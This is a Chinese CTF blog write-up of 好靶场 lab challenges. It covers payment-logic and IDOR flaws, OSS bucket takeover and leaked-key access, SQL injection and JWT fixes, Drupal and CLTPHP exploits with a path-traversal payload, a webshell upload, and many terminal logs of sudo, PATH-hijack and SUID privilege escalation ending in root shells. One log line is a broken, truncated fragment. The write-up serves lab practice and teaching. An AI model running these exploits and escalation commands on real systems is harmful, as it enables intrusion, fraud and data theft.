---
title: 好靶场日常刷题「持续更新」
published: 2026-05-01
pubDate: 2026-05-01
description: 好靶场 zsm
pinned: false
tags: ["web"]
author: zsm
category: CTF-web
draft: false 
licenseName: "MIT"
lang: 'zh_CN'
---

## 前言

好靶场天天看别人刷了，自己也来玩玩(日常吐槽：怎么都要vip)，哎哟我，嫖了个黄🈸的会员，起飞了

## SRC训练家

### 越权：一个多租户的学生登录系统2

进去可以看见是一个门户网页，美国大学可以直接登录，上去是普通用户

尝试另外两个大学登录，发现失败，发现`school`参数不一样，尝试登录美国大学的时候替换

发现无果，登录上去之后发现有`点击学校`这个东西，发现要填入`school`和`pid`，尝试替换

发现只更换`school`不行，两个一起替换但还是user权限，尝试修改`type`值，发现改成空即可


![image](./attachments/260501-221718.avif)

### 支付漏洞: 负数充值案例靶场

就很纯粹，改成负数充值就行了

这种情况一般就是神人开发没有处理负数域的数据，进入之后成了`余额+(-100)`, 这样的话在逻辑上可能成为了退款、提现这种行为，还有就有可能神人开发写成`abs`处理而且后端接口没有规范数据判断


![image](./attachments/260501-223725.avif)

### 支付：四舍五入充值靶场

尝试了两位小数发现四舍五入没有用，扩到三位，拿到flag了

### 支付：负数购买案列

购买的时候物品价格改成负数就行了

### 支付：商城修改金额支付漏洞

改成低价就行了

### 支付：入门舍入漏洞

改成小数

### 支付：请一口气买101个汉堡

就很怪，你去买卷，然后你再退，他会退给你全部的金额，但是卷只少一个，有点像那种api就没写完的情况

### 登录：一个可以注册的系统

随便输入密码发现系统密码是`88888888`，直接爆破出不来，尝试注册页面

注册页面爆破用户名可以拿到`zhangsan`，手机号不用管，然后登录上去就行了

### 登录：不是，你忘记密码功能是怎么做的？

先喷洒用户名，拿到`liuyang`，然后忘记密码去改

### 忘记密码：某学校-任意用户密码重置

这个的情况就类似手机号去重置密码，但是可以任意接管手机号一样，但是这个题也不用去改包什么的，就有点怪（

### 短信验证码：短信验证码暴力突破

抓包爆破验证码

## oss

### oss出了什么问题？

给了你一个oss的存储文件下载地址，发现后面编号`001`可以改，fuzz一下，`010`是flag

### oss出了什么问题2？

存储桶上传覆盖漏洞，随便传个文件，发现`错误：只允许上传文件名为 flag.txt 的文件`，估计是同文件名的会匹配到，然后覆盖掉

### oss存储桶爆破

给了一个信息`haobachang()x()x001.oss-cn-chengdu.aliyuncs.com`，括号里面是数字但是不知道，也就是爆破这个就行了，其实学过云计算的应该知道，oss存储桶在云服务器厂商给的时候，就是`name.地区(or用户名).厂商.域名`，也就是目前部分name已知，爆破一下

生成全部的可能性，然后httpx探活一下

>httpx -l url.txt -status-code  

### oss出了什么问题3？

前端js泄露了密钥，那就可以直接连接了

```python
import oss2

access_key_id = ""
access_key_secret = ""
endpoint = "http://oss-cn-chengdu.aliyuncs.com"
bucket_name = "haobachang522"

auth = oss2.Auth(access_key_id, access_key_secret)
bucket = oss2.Bucket(auth, endpoint, bucket_name)

for obj in oss2.ObjectIterator(bucket):
    print(f"发现文件: {obj.key}")

target_files = ["flag", "flag.txt", "secret.txt"]
for target in target_files:
    try:
        print(f"正在尝试读取: {target}")
        result = bucket.get_object(target)
        print(f"成功获取内容: {result.read().decode('utf-8')}")
    except oss2.exceptions.NoSuchKey:
        print(f"文件 {target} 不存在")
    except Exception as e:
        print(f"读取 {target} 时出错: {e}")
```

### oss接管

这个题目比较麻烦（，懒得写了，其实是他这个oss服务有问题

```
curl https://hbc236783.oss-cn-chengdu.aliyuncs.com/
<?xml version="1.0" encoding="UTF-8"?>
<Error>
  <Code>NoSuchBucket</Code>
  <Message>The specified bucket does not exist.</Message>
  <RequestId></RequestId>
  <HostId>hbc236783.oss-cn-chengdu.aliyuncs.com</HostId>
  <BucketName>hbc236783</BucketName>
  <EC>0015-00000101</EC>
  <RecommendDoc>https://api.aliyun.com/troubleshoot?q=0015-00000101</RecommendDoc>
</Error>
```

回显`The specified bucket does not exist.`，这种情况可以被接管，原因是DNS 层解析成功，但是没有一个叫这个的oss，也就是没有这个玩意，此时，该域名就变成了一个指向 OSS 平台的“孤儿域名”。攻击者只需要在自己的阿里云账号下，创建一个同名的 Bucket（如果之前是按 Bucket 域名指向）或者重新将该自定义域名绑定到自己新创建的 Bucket 上，就可以控制该域名的内容。

去阿里云搞个一模一样名字的oss，然后在上面添加一个`flag.txt`，把公共访问打开，就可以平替他了

## 代码审计&代码修复

### SQL注入-PHP

给的代码

```php
<?php
function getUserById($conn, $userId) {
    $query = "SELECT * FROM users WHERE id = " . $userId;
    
    $result = mysqli_query($conn, $query);
    
    if (!$result) {
        error_log("查询用户失败: " . mysqli_error($conn));
        return [];
    }
    
    $users = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $users[] = $row;
    }
    
    mysqli_free_result($result);
    return $users;
}
?>
```

很明显的sql注入，第一开始尝试转int不行，那就更规范一点

```php
<?php
function getUserById($conn,$userId){
$stmt=mysqli_prepare($conn,"SELECT * FROM users WHERE id=?");
mysqli_stmt_bind_param($stmt,"i",$userId);
mysqli_stmt_execute($stmt);
$result=mysqli_stmt_get_result($stmt);
while($row=mysqli_fetch_assoc($result))$users[]=$row;
return $users??[];
}
?>
```

把SQL 结构和用户数据分离，现在输入`1 OR 1=1`进去是`id = "1 OR 1=1"`

### SQL注入-Go

```golang
func GetUserByID(db *sql.DB, userID string) ([]User, error) {
	query := fmt.Sprintf("SELECT * FROM users WHERE id = %s", userID)

	rows, err := db.Query(query)
	if err != nil {
		log.Printf("查询用户失败: %v", err)
		return nil, err
	}
	defer rows.Close()

	var users []User
	for rows.Next() {
		var user User
		err := rows.Scan(&user.ID, &user.Username, &user.Email)
		if err != nil {
			log.Printf("扫描数据失败: %v", err)
			continue
		}
		users = append(users, user)
	}

	return users, nil
}
```

数据库这直接拼接了，和上面处理差不多

```golang
query := "SELECT * FROM users WHERE id = ?"
rows, err := db.Query(query, userID)
```

但是不知道为什么过不去，好奇怪啊草

### JWTFIX-Go

```golang
func ValidateToken(tokenString string) (bool, *CustomClaims, error) {
	claims := &CustomClaims{}
	token, err := jwt.ParseUnverified(tokenString, claims)
	if err != nil {
		log.Printf("Token格式解析失败: %v", err)
		return false, nil, err
}
```

认证问题

>jwt.ParseUnverified(tokenString, claims)

只解析，不验证，比如

```
{
  "username":"user",
  "role":"user"
}
```

我可以给他全换成admin，然后编码交上去，就`claims.Role == "admin"`了，golang里面`ParseWithClaims`回去校验，加上就行了

```golang
func ValidateToken(tokenString string) (bool, *CustomClaims, error) {
	claims := &CustomClaims{}

	token, err := jwt.ParseWithClaims(
		tokenString,
		claims,
		func(token *jwt.Token) (interface{}, error) {
			return []byte(secretKey), nil
		},
	)

	if err != nil || !token.Valid {
		return false, nil, err
	}

	return true, claims, nil
}
```

python的题目和这个差不多，懒得写了()

## HW/红队实战

### Drupal 7.57

先搜一下这个版本，找到[cve](https://github.com/pimps/CVE-2018-7600)

甚至不用提权，直接拿flag

### Drupal 8.3.0&8.5.0

复现[cve](https://github.com/vulhub/vulhub/blob/master/drupal/CVE-2017-6920/README.zh-cn.md)

[工具一把梭](https://github.com/dreadlocked/Drupalgeddon2)

### CLTPHP 6.0

存在cve2023-30267，poc好难找，找到了也没用，读不了内部文件()，但是可以知道`Template.php`有问题，扒下来看看

```php

public function edit(){

        $filename = input(&#x27;param.file&#x27;);

        if(input(&#x27;param.type&#x27;)){

            $type = input(&#x27;param.type&#x27;);

        }else{

            $type = strtolower(substr($filename,strrpos($filename, &#x27;.&#x27;)-strlen($filename)+1));

        }

        $path = $type==$this-&gt;viewSuffix ?  $this-&gt;filepath : $this-&gt;publicpath.$type.&#x27;/&#x27;;

        $file = $path.$filename;

        if(file_exists($file)){

            $file=iconv(&#x27;gb2312&#x27;,&#x27;utf-8&#x27;,$file);

            $content = file_get_contents($file);

            $this-&gt;assign ( &#x27;filename&#x27;,$filename );

            $this-&gt;assign ( &#x27;title&#x27;,&#x27;修改模版内容&#x27; );

            $this-&gt;assign ( &#x27;file&#x27;,$file );

            $this-&gt;assign ( &#x27;content&#x27;,$content );

        }else{

            $this-&gt;error(&#x27;文件不存在！&#x27;);

        }

        return $this-&gt;fetch();

    }
```

从代码可以看出 file 和 type 是从用户输入获取的 而且没有进行过滤，所以导致后面直接拼接路径获取不同的文件。

那么`file=../../../../../../etc/passwd`，但是后面会跟上type，如果不type 的值不为html的时候 path的值会变化为固定值，这样拼接出来的目录就会变成一个不存在的目录

所以`?file=../../../../../../../../../tmp/flag.txt&type=html`即可

### DaiCuoCms

后台在admin.php，默认账户密码登录

文章上传可以传图片马，设置那里可以把上传文件目录改了，改个顺手的就行，然后文章那上传图片


![image](./attachments/260502-132112.avif)

蚁剑连接上去就行了

### 哎，一个文件防篡改系统

登录进去，查看文件那里可以目录穿越，直接读flag

如果想拿shell的话，往`/etc/cron.d/`里面文件写定时任务，去弹shell就行了

## 提权

### 最简单的提权

```
www-data@97e8a87ab712:/var/www/html$ ls
index.php
www-data@97e8a87ab712:/var/www/html$ sudo -l 
sudo -l
Matching Defaults entries for www-data on 97e8a87ab712:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 97e8a87ab712:
    (ALL) NOPASSWD: /bin/su
www-data@97e8a87ab712:/var/www/html$ sudo su
sudo su
id
uid=0(root) gid=0(root) groups=0(root)
```

### 命令劫持

```
www-data@91e97c0e6ffe:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on 91e97c0e6ffe:
    env_reset, mail_badpass, use_pty

User www-data may run the following commands on 91e97c0e6ffe:
    (root) NOPASSWD: /var/start.sh
www-data@91e97c0e6ffe:/var/www/html$ cat /var/start.sh
cat /var/start.sh
-e #!/bin/bash
ls /etc
www-data@91e97c0e6ffe:/var/www/html$ echo "cat /root/flag.txt" > /tmp/ls
echo "cat /root/flag.txt" > /tmp/ls
www-data@91e97c0e6ffe:/var/www/html$ chmod +x /tmp/ls
chmod +x /tmp/ls
www-data@91e97c0e6ffe:/var/www/html$ sudo PATH=/tmp:$PATH /var/start.sh
sudo PATH=/tmp:$PATH /var/start.sh
/var/start.sh: 1: -e: not found
flag{c28ca00afdd342fc9f85cb708f08c0d6}
```

其实就是他执行一半的时候，我注入新的环境变量，让他去执行我的命令，比如这个题目里面他用了`ls`，我去伪造一个，让他执行我想要东西

于是`ls /etc`就变成了`/tmp/ls /etc`

### 提权碎片2

```
newuser@1e8fae24f8b5:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/od
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@1e8fae24f8b5:/$ sudo su
bash: sudo: command not found
newuser@1e8fae24f8b5:/$ od /root/flag.txt
0000000 066146 063541 030173 062544 034471 034462 032541 030463
0000020 032062 031071 061071 032144 030463 062144 034463 060463
0000040 063145 062067 076464 000012
0000047
```

### 提权碎片3

```
newuser@206025919a19:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/nohup
newuser@206025919a19:/$ /usr/bin/nohup cat /root/flag.txt > /tmp/1 2>&1           
newuser@206025919a19:/$ cat /tmp/1
/usr/bin/nohup: ignoring input
flag{84fb83f1d26b440380a54ae15f307f99}
```

### 提权碎片4

```
newuser@15e393845599:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/nl
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su

newuser@15e393845599:/$ 
newuser@15e393845599:/$ /usr/bin/nl /root/flag.txt
     1  flag{518202b987ff40db9a78244e47ef0edb}
```
### 提权碎片5

```
newuser@94211729521e:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/nice
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@94211729521e:/$ /usr/bin/nice /bin/sh -p
# id
uid=1000(newuser) gid=1000(newuser) euid=0(root) groups=1000(newuser)
# cat /root/flag.txt
flag{b119f81661d642a98a898c5e893f1420}
```

### 提权碎片6

```
newuser@88df4dfa49f7:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/xz
newuser@88df4dfa49f7:/$ /usr/bin/xz -c /root/flag.txt | xz -d
flag{4861b044d1944876bfc479e887261cc4}
```

### 提权碎片7

```
newuser@4d344744fa9d:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/mv
/usr/bin/su
newuser@4d344744fa9d:/$ /usr/bin/mv /root/flag.txt .
newuser@4d344744fa9d:/$ ls
bin  boot  dev  etc  flag.txt  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
newuser@4d344744fa9d:/$ cat flag.txt
flag{ae7cb64ce651419d9b0f174dafcecf4a}
```

### 提权碎片8

```
newuser@613343802e58:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/more
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@613343802e58:/$ /usr/bin/more /root/flag.txt
flag{cc4e36f86f0b4845a102026da87eb451}
```

### 提权碎片9

```
newuser@2c515471ac25:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mawk
newuser@2c515471ac25:/$ /usr/bin/mawk '{print}' /root/flag.txt
flag{9e680891692d47b4b54dac0662ca60b5}
```

### 提权碎片10

```
newuser@ce4fc06ff969:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/sbin/logsave
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@ce4fc06ff969:/$ /usr/sbin/logsave /tmp/flag_copy cat /root/flag.txt
flag{0d119f4f25d84cb1b5af22d35d347962}
```

### 提权碎片11

```
newuser@9e372b9aed05:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/join
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@9e372b9aed05:/$ /usr/bin/join /root/flag.txt /root/flag.txt
flag{96283d912761484caa1c9ff9093fade8}
```

### 提权碎片12

```
newuser@e1036b8b7c04:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/ionice
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@e1036b8b7c04:/$ /usr/bin/ionice cat /root/flag.txt
flag{7507223c5ef74058a9d391efd4078026}
```

### 提权碎片13

```
newuser@63429aed7b91:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/install
/usr/bin/su
newuser@63429aed7b91:/$ /usr/bin/install -m 777 /root/flag.txt /tmp/flag1     
newuser@63429aed7b91:/$ cat /tmp/flag1
flag{52b24dc100564aaa9970466ff12a2705}
```

### 提权碎片14

```
newuser@35f06efb438f:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/iconv
newuser@35f06efb438f:/$ /usr/bin/iconv -f UTF-8 -t UTF-8 /root/flag.txt
flag{7836b462126c4017a4c7efee6272a2ed}
```

### 提权碎片15

```
newuser@b46dcc5396b5:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/head
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@b46dcc5396b5:/$ /usr/bin/head /root/flag.txt
flag{64c6f925f3024414a1b69a168db59bfa}
```

### 提权碎片16

```
newuser@a50e3d15c9c6:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gzip
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@a50e3d15c9c6:/$ /usr/bin/gzip -c /root/flag.txt | gunzip
flag{a95b78ef4451479fb06e94e907aea629}
```

### 提权碎片31

```
newuser@abaf99228905:/$ find / -perm -u=s -type f 2>/dev/null                                                                                                                                         
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
newuser@abaf99228905:/$ sudo -l
Matching Defaults entries for newuser on abaf99228905:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User newuser may run the following commands on abaf99228905:
    (ALL) NOPASSWD: /usr/bin/steghide
<0\x10\x00\x00\x00\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00\x64\x61\x74\x61\x00\x00\x20\x00" > /tmp/noise.wav
newuser@abaf99228905:~$ dd if=/dev/urandom bs=1024 count=2048 >> /tmp/noise.wav
2048+0 records in
2048+0 records out
2097152 bytes (2.1 MB, 2.0 MiB) copied, 0.015681 s, 134 MB/s
newuser@abaf99228905:~$ sudo /usr/bin/steghide embed -ef /root/flag.txt -cf /tmp/noise.wav -p 123456 -sf /tmp/pwned.wav
embedding "/root/flag.txt" in "/tmp/noise.wav"... done
writing stego file "/tmp/pwned.wav"... done
newuser@abaf99228905:~$ steghide extract -sf /tmp/pwned.wav -p 123456 -f
wrote extracted data to "flag.txt".
newuser@abaf99228905:~$ cat flag.txt
flag{298e124348ff4a5c82085d9858e4d8f7}
```

### 提权碎片30

```
newuser@f415d5f1fceb:/$ sudo -l                                                                                                                                                                       
bash: sudo: command not found
newuser@f415d5f1fceb:/$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/arp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
newuser@f415d5f1fceb:/$ /usr/sbin/arp -v -f /root/flag.txt
>> flag{caa45f93d1aa415aa5025ccc47b88f74}
```

其他的感觉没什么意思了，先不打

### php提权？

```
www-data@9134946d760e:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on 9134946d760e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 9134946d760e:
    (root) NOPASSWD: /usr/local/bin/php
www-data@9134946d760e:/var/www/html$ sudo /usr/local/bin/php -r "readfile('/root/flag.txt');"
</usr/local/bin/php -r "readfile('/root/flag.txt');"
flag{ef8965431f4a4e61a5e9325b1521707d}
```

### 一个不存在的文件居然也可以提权

```
www-data@988655860e59:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on 988655860e59:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on 988655860e59:
    (root) NOPASSWD: /var/www/html/haobachang.html
www-data@988655860e59:/var/www/html$ echo '#!/bin/bash' > /var/www/html/haobachang.html
< echo '#!/bin/bash' > /var/www/html/haobachang.html
www-data@988655860e59:/var/www/html$ echo '/bin/bash -p' >> /var/www/html/haobachang.html
<cho '/bin/bash -p' >> /var/www/html/haobachang.html
www-data@988655860e59:/var/www/html$ chmod +x /var/www/html/haobachang.html
chmod +x /var/www/html/haobachang.html
www-data@988655860e59:/var/www/html$ sudo /var/www/html/haobachang.html
sudo /var/www/html/haobachang.html
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
flag{4cabd14ecbfe475b8d902f16c0979d89}
```

### cp提权？

```
newuser@d29cf322abd7:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/cp
/usr/bin/newgrp
/usr/bin/su
newuser@d29cf322abd7:/$ /usr/bin/cp /root/flag.txt /tmp/flag1     
newuser@d29cf322abd7:/$ cat /tmp/flag1
flag{f5103e1e7c8e4e588db43acdda411c8e}
```
